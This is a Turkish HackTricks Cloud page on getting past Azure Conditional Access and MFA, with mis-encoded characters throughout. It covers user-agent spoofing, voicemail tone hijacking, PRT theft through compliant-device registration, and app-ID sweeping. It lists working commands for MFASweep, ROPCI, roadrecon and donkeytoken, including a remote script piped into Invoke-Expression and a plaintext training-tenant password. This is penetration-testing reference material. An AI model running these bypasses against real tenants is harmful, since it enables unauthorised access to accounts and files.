# Az - KoÅŸullu EriÅŸim PolitikalarÄ± & MFA Atlatma

{% hint style="success" %}
AWS Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n:<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
GCP Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarÄ±nÄ±**](https://github.com/sponsors/carlospolop) kontrol edin!
* **ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n ya da **Twitter**'da **bizi takip edin** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Hacking ipuÃ§larÄ±nÄ± paylaÅŸmak iÃ§in** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gÃ¶nderin.

</details>
{% endhint %}

## Temel Bilgiler

Azure KoÅŸullu EriÅŸim politikalarÄ±, belirli **koÅŸullara** dayalÄ± olarak Azure hizmetlerine ve uygulamalarÄ±na eriÅŸim kontrollerini uygulamak iÃ§in Microsoft Azure'da kurulan kurallardÄ±r. Bu politikalar, organizasyonlarÄ±n doÄŸru koÅŸullar altÄ±nda doÄŸru eriÅŸim kontrollerini uygulayarak kaynaklarÄ±nÄ± gÃ¼vence altÄ±na almasÄ±na yardÄ±mcÄ± olur.\
KoÅŸullu eriÅŸim politikalarÄ± temelde **Kim**'in **Neyi** **Nereden** ve **NasÄ±l** eriÅŸebileceÄŸini **tanÄ±mlar**.

Ä°ÅŸte birkaÃ§ Ã¶rnek:

1. **Oturum AÃ§ma Risk PolitikasÄ±**: Bu politika, bir oturum aÃ§ma riski tespit edildiÄŸinde Ã§ok faktÃ¶rlÃ¼ kimlik doÄŸrulama (MFA) gerektirecek ÅŸekilde ayarlanabilir. Ã–rneÄŸin, bir kullanÄ±cÄ±nÄ±n oturum aÃ§ma davranÄ±ÅŸÄ±, farklÄ± bir Ã¼lkeden oturum aÃ§mak gibi, normal desenine gÃ¶re alÄ±ÅŸÄ±lmadÄ±k olduÄŸunda, sistem ek kimlik doÄŸrulama talep edebilir.
2. **Cihaz Uygunluk PolitikasÄ±**: Bu politika, yalnÄ±zca organizasyonun gÃ¼venlik standartlarÄ±na uygun cihazlarÄ±n Azure hizmetlerine eriÅŸimini kÄ±sÄ±tlayabilir. Ã–rneÄŸin, yalnÄ±zca gÃ¼ncel antivirÃ¼s yazÄ±lÄ±mÄ±na sahip veya belirli bir iÅŸletim sistemi sÃ¼rÃ¼mÃ¼nÃ¼ Ã§alÄ±ÅŸtÄ±ran cihazlardan eriÅŸime izin verilebilir.

## KoÅŸullu EriÅŸim PolitikasÄ± AtlatmalarÄ±

Bir koÅŸullu eriÅŸim politikasÄ±nÄ±n **kolayca manipÃ¼le edilebilecek bazÄ± bilgileri kontrol etmesi mÃ¼mkÃ¼ndÃ¼r, bu da politikanÄ±n atlatÄ±lmasÄ±na olanak tanÄ±r**. Ã–rneÄŸin, politika MFA'yÄ± yapÄ±landÄ±rÄ±yorsa, saldÄ±rgan bunu atlatabilecektir.

Bir koÅŸullu eriÅŸim politikasÄ± yapÄ±landÄ±rÄ±rken, etkilenen **kullanÄ±cÄ±larÄ±** ve **hedef kaynaklarÄ±** (tÃ¼m bulut uygulamalarÄ± gibi) belirtmek gerekir.

AyrÄ±ca, politikayÄ± **tetikleyen** **koÅŸullarÄ±** yapÄ±landÄ±rmak da gereklidir:

* **AÄŸ**: IP, IP aralÄ±klarÄ± ve coÄŸrafi konumlar
* Bir VPN veya Proxy kullanarak bir Ã¼lkeye baÄŸlanarak veya izin verilen bir IP adresinden oturum aÃ§arak atlatÄ±labilir
* **Microsoft riskleri**: KullanÄ±cÄ± riski, Oturum aÃ§ma riski, Ä°Ã§eriden gelen risk
* **Cihaz platformlarÄ±**: Herhangi bir cihaz veya Android, iOS, Windows Phone, Windows, macOS, Linux'u seÃ§in
* â€œHerhangi bir cihazâ€ seÃ§ilmediyse ancak diÄŸer tÃ¼m seÃ§enekler seÃ§ildiyse, bu platformlarla ilgili olmayan rastgele bir kullanÄ±cÄ± aracÄ±sÄ± kullanarak atlatmak mÃ¼mkÃ¼ndÃ¼r
* **Ä°stemci uygulamalarÄ±**: SeÃ§enekler â€œTarayÄ±cÄ±â€, â€œMobil uygulamalar ve masaÃ¼stÃ¼ istemcileriâ€, â€œExchange ActiveSync istemcileriâ€ ve â€œDiÄŸer istemcilerâ€
* SeÃ§ilmeyen bir seÃ§enekle oturum aÃ§mayÄ± atlatmak iÃ§in
* **Cihazlar iÃ§in filtre**: KullanÄ±lan cihaza iliÅŸkin bir kural oluÅŸturmak mÃ¼mkÃ¼ndÃ¼r
* **Kimlik doÄŸrulama akÄ±ÅŸlarÄ±**: SeÃ§enekler â€œCihaz kodu akÄ±ÅŸÄ±â€ ve â€œKimlik doÄŸrulama transferiâ€
* Bu, bir saldÄ±rganÄ± etkilemeyecektir, aksi takdirde bu protokollerden herhangi birini bir oltalama giriÅŸiminde kurbanÄ±n hesabÄ±na eriÅŸmek iÃ§in kÃ¶tÃ¼ye kullanmaya Ã§alÄ±ÅŸÄ±yorsa

OlasÄ± **sonuÃ§lar**: EriÅŸimi engelle veya MFA gerektirmek, cihazÄ±n uygun olmasÄ±nÄ± saÄŸlamak gibi potansiyel koÅŸullarla eriÅŸim izni ver.

### Cihaz PlatformlarÄ± - Cihaz KoÅŸulu

**Cihaz platformÄ±na** (Android, iOS, Windows, macOS...) dayalÄ± bir koÅŸul ayarlamak mÃ¼mkÃ¼ndÃ¼r, ancak bu **kullanÄ±cÄ± aracÄ±sÄ±na** dayandÄ±ÄŸÄ± iÃ§in atlatmak kolaydÄ±r. TÃ¼m seÃ§enekleri MFA'yÄ± zorlamak iÃ§in ayarlasanÄ±z bile, eÄŸer **tanÄ±nmayan bir kullanÄ±cÄ± aracÄ±sÄ±** kullanÄ±yorsanÄ±z, MFA'yÄ± veya engellemeyi atlatabileceksiniz:

<figure><img src="../../../.gitbook/assets/image (352).png" alt=""><figcaption></figcaption></figure>

TarayÄ±cÄ±nÄ±n **bilinmeyen bir kullanÄ±cÄ± aracÄ±sÄ± gÃ¶ndermesini saÄŸlamak** (Ã¶rneÄŸin `Mozilla/5.0 (compatible; MSIE 10.0; Windows Phone 8.0; Trident/6.0; IEMobile/10.0; ARM; Touch; NOKIA; Lumia 920) UCBrowser/10.1.0.563 Mobile`) bu koÅŸulu tetiklememek iÃ§in yeterlidir.\
KullanÄ±cÄ± aracÄ±sÄ±nÄ± **geliÅŸtirici araÃ§larÄ±nda** **manuel olarak** deÄŸiÅŸtirebilirsiniz:

<figure><img src="../../../.gitbook/assets/image (351).png" alt="" width="375"><figcaption></figcaption></figure>

&#x20;Ya da [bunun gibi bir tarayÄ±cÄ± uzantÄ±sÄ±](https://chromewebstore.google.com/detail/user-agent-switcher-and-m/bhchdcejhohfmigjafbampogmaanbfkg?hl=en) kullanabilirsiniz.

### Konumlar: Ãœlkeler, IP aralÄ±klarÄ± - Cihaz KoÅŸulu

EÄŸer bu koÅŸullu politikada ayarlanmÄ±ÅŸsa, bir saldÄ±rgan sadece **izin verilen Ã¼lkede** bir **VPN** kullanabilir veya bu koÅŸullarÄ± atlatmak iÃ§in **izin verilen bir IP adresinden** eriÅŸim saÄŸlamanÄ±n bir yolunu bulmaya Ã§alÄ±ÅŸabilir.

### Bulut UygulamalarÄ±

Bir kullanÄ±cÄ± **belirli bir uygulamaya** eriÅŸmeye Ã§alÄ±ÅŸtÄ±ÄŸÄ±nda, **koÅŸullu eriÅŸim politikalarÄ±nÄ± engellemek veya zorlamak** (Ã¶rneÄŸin MFA) mÃ¼mkÃ¼ndÃ¼r:

<figure><img src="../../../.gitbook/assets/image (353).png" alt=""><figcaption></figcaption></figure>

Bu korumayÄ± atlatmaya Ã§alÄ±ÅŸmak iÃ§in, **sadece herhangi bir uygulamaya** giriÅŸ yapÄ±p yapamayacaÄŸÄ±nÄ±za bakmalÄ±sÄ±nÄ±z.\
[**AzureAppsSweep**](https://github.com/carlospolop/AzureAppsSweep) aracÄ±, **hardcoded** olarak **onlarca uygulama kimliÄŸi** iÃ§erir ve bunlara giriÅŸ yapmaya Ã§alÄ±ÅŸÄ±r, baÅŸarÄ±lÄ± olursa size token bile verebilir.

**Belirli kaynaklarda belirli uygulama kimliklerini test etmek** iÃ§in ayrÄ±ca ÅŸu aracÄ± kullanabilirsiniz:

{% code overflow="wrap" %}
```bash
roadrecon auth -u user@email.com -r https://outlook.office.com/ -c 1fec8e78-bce4-4aaf-ab1b-5451cc387264 --tokens-stdout

<token>
```
{% endcode %}

AyrÄ±ca, giriÅŸ yÃ¶ntemini korumak da mÃ¼mkÃ¼ndÃ¼r (Ã¶rneÄŸin, tarayÄ±cÄ±dan veya masaÃ¼stÃ¼ uygulamasÄ±ndan giriÅŸ yapmaya Ã§alÄ±ÅŸÄ±yorsanÄ±z). AraÃ§ [**Invoke-MFASweep**](az-conditional-access-policies-mfa-bypass.md#invoke-mfasweep) bu korumalarÄ± aÅŸmaya Ã§alÄ±ÅŸmak iÃ§in bazÄ± kontroller gerÃ§ekleÅŸtirir.

AraÃ§ [**donkeytoken**](az-conditional-access-policies-mfa-bypass.md#donkeytoken) benzer amaÃ§lar iÃ§in kullanÄ±labilir, ancak bakÄ±msÄ±z gÃ¶rÃ¼nÃ¼yor.

AraÃ§ [**ROPCI**](https://github.com/wunderwuzzi23/ropci) bu korumalarÄ± test etmek ve MFA'larÄ± veya engelleri aÅŸmanÄ±n mÃ¼mkÃ¼n olup olmadÄ±ÄŸÄ±nÄ± gÃ¶rmek iÃ§in de kullanÄ±labilir, ancak bu araÃ§ **beyaz kutu** perspektifinden Ã§alÄ±ÅŸÄ±r. Ã–ncelikle kiracÄ±da izin verilen Uygulamalar listesini indirmeniz gerekir ve ardÄ±ndan bunlara giriÅŸ yapmaya Ã§alÄ±ÅŸacaktÄ±r.

## DiÄŸer Az MFA AÅŸmalarÄ±

### Zil sesi

Bir Azure MFA seÃ§eneÄŸi, **yapÄ±landÄ±rÄ±lmÄ±ÅŸ telefon numarasÄ±na bir Ã§aÄŸrÄ± almak** ve kullanÄ±cÄ±dan **`#` karakterini gÃ¶ndermesini istemektir**.

{% hint style="danger" %}
Karakterler sadece **tonlar** olduÄŸundan, bir saldÄ±rgan **telefon numarasÄ±nÄ±n** **sesli mesajÄ±nÄ± ele geÃ§irebilir**, mesaj olarak **`#` tonunu** yapÄ±landÄ±rabilir ve ardÄ±ndan MFA talep edildiÄŸinde **kurbanÄ±n telefonunun meÅŸgul olduÄŸundan emin olabilir** (aramak suretiyle) bÃ¶ylece Azure Ã§aÄŸrÄ±sÄ± sesli mesaja yÃ¶nlendirilir.
{% endhint %}

### Uyumlu Cihazlar

Politikalar genellikle uyumlu bir cihaz veya MFA talep eder, bu nedenle bir **saldÄ±rgan uyumlu bir cihaz kaydedebilir**, bir **PRT** token alabilir ve **bu ÅŸekilde MFA'yÄ± aÅŸabilir**.

Ã–ncelikle **Intune'da uyumlu bir cihaz kaydedin**, ardÄ±ndan **PRT'yi alÄ±n**:
```powershell
$prtKeys = Get-AADIntuneUserPRTKeys - PfxFileName .\<uuid>.pfx -Credentials $credentials

$prtToken = New-AADIntUserPRTToken -Settings $prtKeys -GertNonce

Get-AADIntAccessTokenForAADGraph -PRTToken $prtToken

<token returned>
```
AÅŸaÄŸÄ±daki sayfada bu tÃ¼r bir saldÄ±rÄ± hakkÄ±nda daha fazla bilgi bulabilirsiniz:

{% content-ref url="../az-lateral-movement-cloud-on-prem/pass-the-prt.md" %}
[pass-the-prt.md](../az-lateral-movement-cloud-on-prem/pass-the-prt.md)
{% endcontent-ref %}

## AraÃ§lar

### [**AzureAppsSweep**](https://github.com/carlospolop/AzureAppsSweep)

Bu script bazÄ± kullanÄ±cÄ± kimlik bilgilerini alÄ±r ve bazÄ± uygulamalara giriÅŸ yapÄ±p yapamayacaÄŸÄ±nÄ± kontrol eder.

Bu, daha sonra **yetki yÃ¼kseltmek** iÃ§in kÃ¶tÃ¼ye kullanabileceÄŸiniz bazÄ± uygulamalara giriÅŸ yapmak iÃ§in **MFA gerektirmediÄŸinizi** gÃ¶rmek iÃ§in faydalÄ±dÄ±r.

### [roadrecon](https://github.com/dirkjanm/ROADtools)

TÃ¼m politikalarÄ± alÄ±r.
```bash
roadrecon plugin policies
```
### [Invoke-MFASweep](https://github.com/dafthack/MFASweep)

MFASweep, saÄŸlanan bir kimlik bilgileri setini kullanarak **Ã§eÅŸitli Microsoft hizmetlerine giriÅŸ yapmayÄ± deneyen ve MFA'nÄ±n etkin olup olmadÄ±ÄŸÄ±nÄ± belirlemeye Ã§alÄ±ÅŸan** bir PowerShell betiÄŸidir. KoÅŸullu eriÅŸim politikalarÄ± ve diÄŸer Ã§ok faktÃ¶rlÃ¼ kimlik doÄŸrulama ayarlarÄ±nÄ±n nasÄ±l yapÄ±landÄ±rÄ±ldÄ±ÄŸÄ±na baÄŸlÄ± olarak bazÄ± protokoller tek faktÃ¶rlÃ¼ kalabilir. AyrÄ±ca, ADFS yapÄ±landÄ±rmalarÄ± iÃ§in ek bir kontrol iÃ§erir ve tespit edilirse yerel ADFS sunucusuna giriÅŸ yapmayÄ± deneyebilir.
```bash
Invoke-Expression (Invoke-WebRequest -Uri "https://raw.githubusercontent.com/dafthack/MFASweep/master/MFASweep.ps1").Content
Invoke-MFASweep -Username <username> -Password <pass>
```
### [ROPCI](https://github.com/wunderwuzzi23/ropci)

Bu araÃ§, MFA atlatmalarÄ±nÄ± tanÄ±mlamaya ve ardÄ±ndan birden fazla Ã¼retim AAD kiracÄ±sÄ±nda API'leri kÃ¶tÃ¼ye kullanmaya yardÄ±mcÄ± olmuÅŸtur; burada AAD mÃ¼ÅŸterileri MFA'nÄ±n zorunlu olduÄŸunu dÃ¼ÅŸÃ¼nÃ¼yordu, ancak ROPC tabanlÄ± kimlik doÄŸrulama baÅŸarÄ±lÄ± oldu.

{% hint style="success" %}
Brute-force yapmak iÃ§in uygulamalarÄ±n listesini oluÅŸturabilmek iÃ§in tÃ¼m uygulamalarÄ± listeleme izinlerinizin olmasÄ± gerekir.
{% endhint %}
```bash
./ropci configure
./ropci apps list --all --format json -o apps.json
./ropci apps list --all --format json | jq -r '.value[] | [.displayName,.appId] | @csv' > apps.csv
./ropci auth bulk -i apps.csv -o results.json
```
### [donkeytoken](https://github.com/silverhack/donkeytoken)

Donkey token, Conditional Access Policies'leri doÄŸrulamak, 2FA etkinleÅŸtirilmiÅŸ Microsoft portallarÄ± iÃ§in testler yapmak gibi ihtiyaÃ§larÄ± olan gÃ¼venlik danÄ±ÅŸmanlarÄ±na yardÄ±mcÄ± olmayÄ± amaÃ§layan bir dizi iÅŸlevdir.

<pre class="language-powershell"><code class="lang-powershell"><strong>git clone https://github.com/silverhack/donkeytoken.git
</strong><strong>Import-Module '.\donkeytoken' -Force
</strong></code></pre>

**Her portali test edin** eÄŸer **MFA olmadan giriÅŸ yapmak mÃ¼mkÃ¼nse**:
```powershell
$username = "conditional-access-app-user@azure.training.hacktricks.xyz"
$password = ConvertTo-SecureString "Poehurgi78633" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential($username, $password)
Invoke-MFATest -credential $cred -Verbose -Debug -InformationAction Continue
```
Ã‡Ã¼nkÃ¼ **Azure** **portalÄ±** **kÄ±sÄ±tlanmamÄ±ÅŸtÄ±r**, Ã¶nceki yÃ¼rÃ¼tme tarafÄ±ndan tespit edilen herhangi bir hizmete eriÅŸmek iÃ§in portal uÃ§ noktasÄ±ndan **bir token toplamak** mÃ¼mkÃ¼ndÃ¼r. Bu durumda Sharepoint tanÄ±mlandÄ± ve ona eriÅŸmek iÃ§in bir token talep edildi:

{% code overflow="wrap" %}
```powershell
$token = Get-DelegationTokenFromAzurePortal -credential $cred -token_type microsoft.graph -extension_type Microsoft_Intune
Read-JWTtoken -token $token.access_token
```
{% endcode %}

Diyelim ki token, Sites.Read.All (Sharepoint'tan) iznine sahip. MFA nedeniyle web Ã¼zerinden Sharepoint'a eriÅŸemeseniz bile, oluÅŸturulan token ile dosyalara eriÅŸmek iÃ§in token'Ä± kullanmak mÃ¼mkÃ¼ndÃ¼r:
```powershell
$data = Get-SharePointFilesFromGraph -authentication $token $data[0].downloadUrl
```
## Referanslar

* [https://www.youtube.com/watch?v=yOJ6yB9anZM\&t=296s](https://www.youtube.com/watch?v=yOJ6yB9anZM\&t=296s)
* [https://www.youtube.com/watch?v=xei8lAPitX8](https://www.youtube.com/watch?v=xei8lAPitX8)

{% hint style="success" %}
AWS Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n:<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks EÄŸitim AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ± (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
GCP Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks EÄŸitim GCP KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ± (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarÄ±nÄ±**](https://github.com/sponsors/carlospolop) kontrol edin!
* **ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n ya da **Twitter**'da **bizi takip edin** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Hacking ipuÃ§larÄ±nÄ± paylaÅŸmak iÃ§in** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gÃ¶nderin.

</details>
{% endhint %}
